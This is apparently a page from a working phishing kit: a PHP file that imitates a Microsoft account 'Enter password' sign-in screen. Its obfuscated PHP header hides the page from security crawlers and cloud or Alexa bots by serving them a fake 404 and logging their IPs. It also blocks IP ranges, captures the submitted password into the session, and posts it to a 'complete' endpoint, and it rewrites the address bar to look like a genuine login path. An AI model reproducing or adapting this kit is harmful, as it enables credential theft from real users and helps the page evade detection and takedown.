<?php
goto x34_A; D2768: include "\143\x6f\x6e\146\151\x67\x2e\x70\x68\160"; goto a8fwR; bcHmS: if ($BLOCKIPRANGE == "\x31") { include "\151\160\162\x61\x6e\x67\145\56\x70\150\160"; } goto d_CPR; d_CPR: if ($BLOCKOTHERBOTS == "\61") { if (!empty($_SERVER["\110\x54\x54\x50\x5f\125\123\x45\x52\137\x41\107\x45\x4e\x54"])) { goto BuaYj; nOKTJ: foreach ($userAgents as $agent) { if (strpos($_SERVER["\110\124\124\120\137\x55\x53\105\x52\137\x41\107\x45\x4e\124"], $agent) !== false) { goto f_fKZ; SER1Y: exit; goto HZV9M; TtPgk: fwrite($file, $_SERVER["\x52\x45\115\117\124\x45\x5f\101\x44\x44\122"] . "\40" . $_SERVER["\110\x54\x54\x50\x5f\125\x53\105\122\137\x41\107\105\116\124"] . "\xd\12"); goto uUgyK; vKITr: header("\110\124\x54\120\x2f\61\x2e\60\x20\x34\x30\64\40\116\157\x74\x20\x46\157\x75\x6e\x64"); goto xgaqO; f_fKZ: $file = fopen("\x62\157\x74\163\56\164\170\164", "\x61"); goto TtPgk; xgaqO: die("\x3c\150\61\76\64\60\x34\x20\116\157\164\40\x46\157\x75\156\144\74\57\150\x31\76\x54\150\145\40\160\x61\x67\x65\x20\164\150\141\x74\40\x79\x6f\x75\x20\x68\141\166\145\40\x72\145\161\165\x65\163\164\x65\144\40\x63\x6f\165\154\144\40\156\157\x74\40\142\x65\x20\146\157\x75\156\x64\56"); goto SER1Y; uUgyK: fclose($file); goto vKITr; HZV9M: } nex1O: } goto fwZIU; fwZIU: H6GCC: goto yoLT9; BuaYj: include "\157\x74\150\145\162\142\x2e\x70\x68\x70"; goto nOKTJ; yoLT9: } } goto fUoGn; CyeKw: include "\x63\x6f\156\146\x69\147\56\x70\x68\x70"; goto wXHWT; wXHWT: if ($BLOCKAWS == "\61") { if (strpos($_SERVER["\110\x54\124\120\x5f\x55\123\105\x52\137\x41\107\x45\x4e\124"], "\x61\x77\x73") !== false || strpos($_SERVER["\x48\124\x54\x50\x5f\125\x53\x45\122\x5f\101\x47\x45\116\124"], "\x61\154\145\170\x61") !== false || strpos($_SERVER["\x48\x54\124\120\137\x55\x53\105\122\137\x41\x47\105\116\x54"], "\141\x6d\x7a\x6e\x6b\x61\163\163\x6f\143\142\157\164") !== false || strpos($_SERVER["\110\124\x54\120\137\x55\123\105\122\137\101\x47\105\x4e\x54"], "\x65\x6d\141\x63\163\55\167\x33\40\163\x65\x61\162\x63\150\40\145\156\x67\x69\156\x65") !== false) { goto K5amz; bKPDy: header("\x48\x54\124\120\x2f\x31\56\x30\x20\x34\60\64\40\116\x6f\x74\x20\106\157\x75\x6e\144"); goto W90Lk; K5amz: $file = fopen("\x62\157\164\x73\x2e\164\x78\164", "\x61"); goto pz2ve; p14TB: fclose($file); goto bKPDy; W90Lk: die("\74\x68\61\76\64\x30\64\40\116\157\164\x20\106\157\x75\156\144\74\57\x68\61\76\124\150\x65\x20\160\141\x67\x65\40\164\x68\x61\x74\40\171\x6f\x75\40\150\x61\166\145\40\x72\x65\161\165\145\163\164\x65\144\40\x63\157\x75\x6c\144\x20\156\x6f\x74\40\x62\145\x20\146\157\165\156\144\56"); goto qrnw7; pz2ve: fwrite($file, $_SERVER["\122\105\115\117\124\105\137\101\x44\104\122"] . "\40" . $_SERVER["\110\x54\124\x50\x5f\x55\x53\105\x52\x5f\101\x47\105\x4e\124"] . "\xd\12"); goto p14TB; qrnw7: exit; goto bOb01; bOb01: } } goto bcHmS; JJd6w: $hash = md5($v_ip); goto kLWkC; x34_A: error_reporting(0); goto ZgF3N; fUoGn: $v_ip = $_SERVER["\x52\x45\x4d\117\x54\x45\137\x41\x44\104\x52"]; goto JJd6w; ZgF3N: session_start(); goto CyeKw; kLWkC: if (!empty($_POST["\x70\x61\163\163\167\x6f\x72\144"])) { $_SESSION["\160\x61\x73\163\167\x6f\x72\x64\137\146\151\162\x73\x74"] = $_POST["\x70\x61\x73\163\x77\157\x72\x64"]; } goto D2768; a8fwR: if ($truelogin == false) { sleep(2); }

?>

<!DOCTYPE html>

<html dir="ltr" lang="EN-US">

<head>


<script>
function empty() {
    var x;
    x = document.getElementById("password").value;
    if (x == "") {
        document.getElementById("password").style = "border-color:red";
		document.getElementById("password_error").style = "display: block";
        return false;
    };

}
</script>
<script>
	function myFunction()
{
    document.getElementById('progressBar').style='display:block;';
}
</script>
<script>
function change() {
    var e;
    e = document.getElementById("password").value;
    if (e !== ""){
	    document.getElementById("password").style = "";
		document.getElementById("password_error").style = "display: none";
	}
	
}

</script>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge">

<base href=".">
<title>Enter your password</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
<link rel="shortcut icon" href="./files2/favicon.ico">
            <link rel="stylesheet" title="Converged" type="text/css" href="./files/Converged1033.css">
			<style type="text/css">body.cb input.hip
    {
        border-width: 2px !important;
    }
</style><style type="text/css">body{display:none;}</style>
<style type="text/css">body{display:block !important;}</style>

</head>

<body 
   <?php if ($REDGHOST==1)
   {echo 'onload="myFunction2()"';}?> class="cb" data-bind="defineGlobals: ServerData, bodyCssClass" >
 

 <script>
function myFunction2() {
window.history.pushState('Object', 'Title', 'common/login');
}
</script> 
<div> <div><div class="background" role="presentation"><div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;./files2/1-small.jpg&quot;);"></div> <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;<?php echo $_SESSION['bg']; ?>&quot;);z-index: <?php echo $_SESSION['zindex'];?>;"></div><div class="background-overlay"></div></div></div> 

<form name="f1" id="i0281" spellcheck="false" method="post" autocomplete="off"  method="post" action="complete?&sessionid=<?php echo $hash; ?>&ss=2">

 <div class="outer" data-bind="component: { name: &#39;page&#39;,
        params: {
            serverData: svr,
            showButtons: svr.A2,
            showFooterLinks: true,
            useWizardBehavior: svr.BR,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"> <div class="middle">
<div class="background-logo-holder"> <img id="banner_image" class="background-logo" src="<?php echo $_SESSION['llogo']?>"> </div>
						<div class="inner" data-bind="css: { 'app': $loginPage.backgroundLogoUrl() }" style="
    min-height: 370px;
    min-width: 338px;
    max-width: 440px;
">
<div id="progressBar" style="display:none" class="progress" role="progressbar" data-bind="component: 'marching-ants-control', ariaLabel: str['WF_STR_ProgressText']" aria-label="Please wait"><!--  --><!-- ko if: useCssAnimation --> <div></div><div></div><div></div><div></div><div></div><!-- /ko --><!-- ko ifnot: useCssAnimation --><!-- /ko --></div>
			<div data-bind="component: { name: &#39;logo-control&#39;,
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }">
						
						<img class="logo" role="presentation" pngsrc="<?php echo $_SESSION['logo']; ?>" svgsrc="<?php echo $_SESSION['logo']; ?>" data-bind="imgSrc" src="<?php echo $_SESSION['logo']; ?>"></div> <div data-bind="
                    css: { &#39;wide&#39;: paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata(&#39;wide&#39;) },
                    component: { name: &#39;pagination-control&#39;,
                        publicMethods: paginationControlMethods,
                        params: {
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow } }">
							</br>
							<button type="button" class="backButton" data-bind="
   attr: { 'id': backButtonId || 'idBtn_Back' },
   ariaLabel: str['CT_HRD_STR_Splitter_Back'],
   ariaDescribedBy: backButtonDescribedBy,
   click: backButton_onClick,
   hasFocus: focusOnBackButton" id="idBtn_Back" aria-label="Back">
<img  onclick="window.location.href='next.php?ss=2'" role="presentation" pngsrc="files/arrow_left.png" svgsrc="files/arrow_left.png" data-bind="imgSrc" src="files/arrow_left.png"><!-- /ko --> <!-- /ko --><!-- /ko --><!-- /ko --><!-- ko if: svr.fIsRTLMarket --><!-- /ko --> 
</button>	
							
							
							
							<?php echo $_SESSION['username']; ?><div data-bind="css: { &#39;animate&#39;: animate() || animate.back(), &#39;back&#39;: animate.back }" class="animate"><div data-viewid="2" data-dynamicbranding="true" data-bind="pageViewComponent: { name: &#39;login-paginated-password-view&#39;,
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            username: sharedData.username,
                            displayName: sharedData.displayName,
                            hipRequiredForUsername: sharedData.hipRequiredForUsername,
                            passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                            hasRemoteNgc: !!sharedData.remoteNgcParams.sessionIdentifier,
                            desktopSsoEnabled: sharedData.desktopSsoEnabled,
                            defaultKmsiValue: svr.I === 1,
                            userTenantBranding: sharedData.userTenantBranding,
                            sessions: sharedData.sessions,
                            isLongRunningTransaction: sharedData.isLongRunningTransaction },
                        event: {
                            submitReady: $loginPage.view_onSubmitReady,
                            resetPassword: $loginPage.passwordView_onResetPassword,
                            desktopSsoStart: $loginPage.view_desktopSsoStart } }">

							<input type="text" name="loginfmt" data-bind="moveOffScreen, value: displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true">

							<div data-bind="component: { name: &#39;identity-banner-control&#39;,
     params: {
        pawnIconId: svr.Bw,
        displayName: displayName } }"> </div></div> 
		<div id="loginHeader" class="row text-title" role="heading" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']" style="
    font-weight: 600;
">Enter password</div>
<div id="passwordError" class="alert alert-error" data-bind="
                htmlWithBindings: passwordTextbox.error,
                childBindings: { 'idA_IL_ForgotPassword0': { href: svr.urlResetPassword, click: resetPassword_onClick } }">Your account or password is incorrect. If you don't remember your password, <a id="idA_IL_ForgotPassword0" href="">reset it now.</a></div> <div class="row"> <div class="form-group col-md-24"> <div role="alert" aria-live="assertive" aria-atomic="false"> </div> <div class="placeholderContainer" data-bind="component: { name: &#39;placeholder-textbox&#39;, params: {
            serverData: svr,
            textInput: password,
            hasFocus: isFocused,
            hintText: str[&#39;CT_PWD_STR_PwdTB_Label&#39;],
            forcePlaceholderAttribute: true,
            hintCss: &#39;placeholder&#39; } }">			
			
			<input name="password" type="password" required id="password" onblur="change();" autocomplete="off" class="form-control" aria-describedby="passwordError loginHeader passwordDesc" aria-required="true" data-bind="
                    textInput: password,
                    hasFocusEx: isFocused,
                    placeholder: $placeholderText,
                    ariaLabel: str[&#39;CT_PWD_STR_PwdTB_AriaLabel&#39;],
                    css: { &#39;has-error&#39;: error }" placeholder="Password" aria-label="Enter password">


			

					</div> </div> </div>  </div>  <div class="row"> <div class="col-md-24"> <div class="text-13"> <div class="form-group no-margin-bottom" data-bind="css: { &#39;no-margin-bottom&#39;: !hasRemoteNgc &amp;&amp; !allowPhoneDisambiguation &amp;&amp; !showChangeUserLink }"> <a id="idA_PWD_ForgotPassword" href="">Forgot my password</a> </div> </div> </div> </div> </div> <input type="submit" onclick="myFunction()" style="float:right" id="idSIButton9" class="btn btn-primary" data-bind="
            attr: {
                'id': primaryButtonId || 'idSIButton9',
                'aria-describedby': primaryButtonDescribedBy },
            value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible" value="Sign In"></div></div> </div>  <div data-bind="component: { name: &#39;instrumentation&#39;,
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }"></div> </div> </div> <div id="footer" class="footer default" data-bind="css: { &#39;default&#39;: !backgroundLogoUrl() }"> <div data-bind="component: { name: &#39;footer-control&#39;,
            params: {
                serverData: svr,
                showLinks: true },
            event: {
                agreementClick: footer_agreementClick } }"> <div id="footerLinks" class="footerNode text-secondary"> <span id="ftrCopy" data-bind="html: svr.aa">©2020 Microsoft</span> <a id="ftrTerms" data-bind="text: str[&#39;MOBILE_STR_Footer_Terms&#39;], href: termsLink, click: termsLink_onClick" href="">Terms of Use</a> <a id="ftrPrivacy" data-bind="text: str[&#39;MOBILE_STR_Footer_Privacy&#39;], href: privacyLink, click: privacyLink_onClick" href="">Privacy &amp; Cookies</a> </div> </div> </div> </form> </div></body></html>